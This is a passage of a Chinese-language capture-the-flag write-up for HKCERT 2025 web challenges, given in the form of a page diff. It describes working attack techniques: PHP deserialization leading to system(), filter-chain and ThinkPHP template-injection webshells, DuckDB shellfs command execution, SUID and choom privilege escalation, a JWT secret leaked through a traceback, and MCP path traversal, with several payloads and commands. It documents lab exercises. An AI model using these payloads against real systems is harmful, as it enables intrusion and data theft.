+<li>属性”action”（数组，位置3）</li>
+<li>内层RequestHandler对象（位置4）</li>
+<li>内层对象的属性”processor”（null，位置5）← R:5引用的就是这里</li>
+</ul>
+<p><code>R:5</code>创建了对<code>processor</code>的引用。<code>__wakeup()</code>在对象反序列化时立即调用，但<code>__construct()</code>在之后被回调。通过回调<code>__construct()</code>，重新创建了匿名类对象，重置了$handle。</p>
+<p>整理了一下大概是：</p>
+<ol>
+<li>反序列化开始</li>
+<li>创建外层对象</li>
+<li>创建内层对象（此时匿名类__wakeup()触发，handle&#x3D;null）</li>
+<li>反序列化完成</li>
+<li>外层对象__destruct()触发</li>
+<li>调用[内层对象, “__construct”]回调</li>
+<li>内层对象__construct()执行，重新创建匿名类对象（handle&#x3D;有效资源）</li>
+<li>调用[processor引用, “execute”]回调</li>
+<li>execute()检查handle资源有效</li>
+<li>执行system($_GET[‘cmd’])</li>
+</ol>
+<p>随后传入合适的cmd打完。</p>
+<h1 id="insph"><a href="#insph" class="headerlink" title="insph"></a>insph</h1><p>依旧新生赛。给到 NPC。</p>
+<p>查看源码时只需要注意到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;data&#x27;])) &#123;</span><br><span class="line">    $data = $_GET[&#x27;data&#x27;];</span><br><span class="line">    if (preg_match(&quot;/zip|phar|uploads/i&quot;,$data))&#123;</span><br><span class="line">        exit(&quot;Don&#x27;t use dangerous protocol!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($data, file_get_contents($data));</span><br><span class="line">    echo &quot;Data processed successfully!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有任意<code>file_put_contents</code>和<code>file_get_contents</code>。我们通过 filter chain 可以构造 resource 为任意文件的 php 一句话木马。而此处<code>file_put_contents</code>的第一个参数（即写入文件名）为 data 本身。</p>
+<p>我们都知道。在<code>file_put_contents</code>函数中，filter 链子的结果就是最后的 resource。因此我们在 resource 里填入木马文件名，再使用filter chain技术使得<code>file_get_contents</code>的返回结果为一句话木马即可。</p>
+<p>这样，<code>file_put_contents</code>的结果就是木马名称，而<code>file_get_contents</code>的结果就是一句话木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system($_GET[1]); ?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>php:&#x2F;&#x2F;temp 改成 a.php 直接写 webshell。访问<code>/a.php?1=cat%20/f*</code>打完。</p>
+<h1 id="renderme"><a href="#renderme" class="headerlink" title="renderme"></a>renderme</h1><p>题目本身的设计还行。但是毫无引导真的想不到是 thinkphp 模板渲染啊。给到 NPC。</p>
+<p>首先随便报个错就能发现是 thinkphp v8.1.3 框架。这个版本打不了常见的 CVE。这里的正解是 SSTI。</p>
+<p>以防你不知道 thinkphp 还有模板功能：<a target="_blank" rel="noopener" href="https://doc.thinkphp.cn/@think-template/default.html">https:&#x2F;&#x2F;doc.thinkphp.cn&#x2F;@think-template&#x2F;default.html</a></p>
+<p>发现是有 WAF 的。黑盒测了以下发现 SERVER.HTTP 的东西可以用，而且可以用 file_put_contents 写。所以我们这里用外带逃逸，把一句话放在 HTTP 头里用 file_put_contents 写进服务器：</p>
+<p>模板的使用方法：</p>
+<p><img src="/images/migrated/19383927/04.png" alt="image"></p>
+<p><code>?name=``{$_SERVER.HTTP_1 | file_put_contents=$_SERVER.HTTP_2}</code></p>
+<p>这样就可以调用 <code>file_put_contents</code> 并且将参数逃逸到 HTTP Headers 中。此处我们添加 HEADER</p>
+<p>1: 1.php<br>2: system($_GET[1])</p>
+<p>就可以把一句话木马写在 1.php 里。</p>
+<p>随后发现要提权。这里查看 linux 内核版本可以打 OOM 的 choom 提权：</p>
+<p><code>1.php?1=choom -n nl /root/f*</code></p>
+<p>打完。</p>
+<h1 id="Dam-Breach"><a href="#Dam-Breach" class="headerlink" title="Dam Breach"></a>Dam Breach</h1><p>队友做的。太强了。是利用一个很隐蔽的<code>DuckDB</code>支持做题解。给到夯。</p>
+<p>打开题目是一个 cloud beaver。有执行所支持的 SQL 脚本的权限。要连接数据库我们可以使用 <code>:memory:</code> 连接其内存数据库。</p>
+<p><img src="/images/migrated/19383927/05.png" alt="image"></p>
+<p>本地搭建一个服务发现他是默认不支持<code>DuckDB</code>的。会有如下安全警示：</p>
+<p><img src="/images/migrated/19383927/06.png" alt="image"></p>
+<p>注意到题目中的服务支持<code>DuckDB</code>。那么就可以考虑用<code>DuckDB</code>去打。先选中<code>DuckDB</code>随后连接内存数据库即可执行<code>DuckDB</code>的 SQL 语句。阅读提示发现<code>DuckDB</code>可以让我们有权限访问本地文件。故此处考虑读文档找有啥函数可以读：<a target="_blank" rel="noopener" href="https://duckdb.org/docs/stable/guides/file_formats/read_file">https://duckdb.org/docs/stable/guides/file_formats&#x2F;read_file</a></p>
+<p>这里能用如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from read_csv(&#x27;/etc/passwd&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>读取到<code>/etc/passwd</code>。但是没有<code>/flag</code>，估计是要 RCE。</p>
+<p>注意到<code>DuckDB</code>支持插件功能。这里找到一个插件：<a target="_blank" rel="noopener" href="https://duckdb.org/community_extensions/extensions/shellfs">https://duckdb.org/community_extensions&#x2F;extensions&#x2F;shellfs</a></p>
+<p>该插件可以帮助我们传入 shell 命令作为参数。</p>
+<p><img src="/images/migrated/19383927/07.png" alt="image"></p>
+<p>因此我们先安装此插件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSTALL shellfs FROM community;</span><br></pre></td></tr></table></figure>
+
+<p>以及</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD shellfs;</span><br></pre></td></tr></table></figure>
+
+<p>随后就可以采用如下方式 RCE：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from read_csv(&#x27;whoami |&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>那么后面就是一个提权。先看看 root 权限的东西都有啥：</p>
+<p><img src="/images/migrated/19383927/08.png" alt="image"></p>
+<p>这里是一个 SUID 提权。找一下发现 <code>find</code> 有 root 权限。用经典的 find SUID 提权打完。</p>
+<p><img src="/images/migrated/19383927/09.png" alt="image"></p>
+<h1 id="nettools"><a href="#nettools" class="headerlink" title="nettools"></a>nettools</h1><p>强网拟态线下决赛的时候我是不是见过这个题目啊（恼），给到拉完了。</p>
+<p>前半部分是原题。后半部分融了个意义不明的 FastMCP 环节。</p>
+<p>代审。先去绕过 auth 系统拿 admin。然后再黑盒打 FastMCP 的相关利用。</p>
+<p>注意到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def verify_token(token: str) -&gt; TokenData:</span><br><span class="line">    print(f&quot;Token to verify: &#123;token&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        SECRET_KEY = &quot;secretkey&quot; if len(token) &lt;= 2048 else base64.b64decode(token[:2048])</span><br><span class="line">    except Exception:</span><br><span class="line">        raise HTTPException(</span><br><span class="line">            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, </span><br><span class="line">            detail=f&quot;Token custom check failed: &#123;traceback.format_exc()&#125;&quot;</span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">    try:     </span><br><span class="line">        payload: dict[str, Any] = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])</span><br><span class="line"></span><br><span class="line">        username: str = payload.get(&quot;sub&quot;)</span><br><span class="line">        </span><br><span class="line">        if username is None:</span><br><span class="line">            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=&quot;Invalid token: &#x27;sub&#x27; missing&quot;)</span><br><span class="line">        </span><br><span class="line">        is_admin = (username == settings.ADMIN_USERNAME)</span><br><span class="line"></span><br><span class="line">        return TokenData(username=username, is_admin=is_admin)</span><br><span class="line">        </span><br><span class="line">    except jwt.PyJWTError:</span><br><span class="line">        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=&quot;Invalid token: signature or expiration failed&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这里报错用了<code>traceback.format_exc()</code>打印异常信息。那么我们可以利用这个信息来获取到 <code>SECRET_KEY</code>。</p>
+<p>我们构建一个畸形的 token 让他失败就行了。比如：</p>
+<p><img src="/images/migrated/19383927/10.png" alt="image"></p>
+<p>用 padding 搞崩他的 base64 解码。通过<code>traceback.format_exc()</code>里的信息获泄露到 <code>SECRET_KEY</code>。随后jwt.io用泄露的<code>SECRET_KEY</code>签一个 admin 用户的 auth 即可。</p>
+<p>进去之后是一个 SSRF。写个脚本挨个端口访问就能发现 9000 端口有东西。访问一下发现是 FastMCP 框架。</p>
+<p>所以我们这里先初始化拿一下 MCP 的 session ID 。随后用如下 payload 列一下工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HEADER:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;application/json, text/event-stream&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;mcp-session-id&quot;: &quot;&lt;MCP_SESSION_ID&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">BODY:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;id&quot;: 2,</span><br><span class="line">  &quot;method&quot;: &quot;tools/list&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>prompts/list</code>下有个<code>where_is_flag</code>的<code>tools</code>，调用这个工具发现 flag 在 <code>/root/1ffflllaaaggg</code>。</p>
+<p>从<code>resources/templates/list</code>中可以得知：</p>
+<p><img src="/images/migrated/19383927/11.png" alt="image"></p>
+<p>这个<code>resource/read</code>可以从 &#x2F;tmp 下任意读。考虑路径穿越。禁止了除<code>base64://tmp/</code>外的<code>/</code>考虑 URL 编码绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HEADER:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;application/json, text/event-stream&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;mcp-session-id&quot;: &quot;&lt;MCP_SESSION_ID&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">BODY:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;id&quot;: 2,</span><br><span class="line">    &quot;method&quot;: &quot;resources/read&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;uri&quot;: &quot;base64://tmp/%2f..%2froot%2f1ffflllaaaggg&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>打完。</p>
+<p>这里还要准备期末后面的题就先放着了。比赛的时候也没做出来，后面也得去看 W&amp;M 的题解再补。先准备期末。</p>
+<p>我们 2.6 香港见。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjs"><span class="toc-number">1.</span> <span class="toc-text">ezjs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BabyUpload"><span class="toc-number">2.</span> <span class="toc-text">BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#react"><span class="toc-number">3.</span> <span class="toc-text">react</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-lua"><span class="toc-number">4.</span> <span class="toc-text">easy-lua</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#r"><span class="toc-number">5.</span> <span class="toc-text">r</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insph"><span class="toc-number">6.</span> <span class="toc-text">insph</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#renderme"><span class="toc-number">7.</span> <span class="toc-text">renderme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dam-Breach"><span class="toc-number">8.</span> <span class="toc-text">Dam Breach</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nettools"><span class="toc-number">9.</span> <span class="toc-text">nettools</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&text=HKCERT 2025 web 部分wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&is_video=false&description=HKCERT 2025 web 部分wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HKCERT 2025 web 部分wp&body=Check out this article: https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&name=HKCERT 2025 web 部分wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&t=HKCERT 2025 web 部分wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
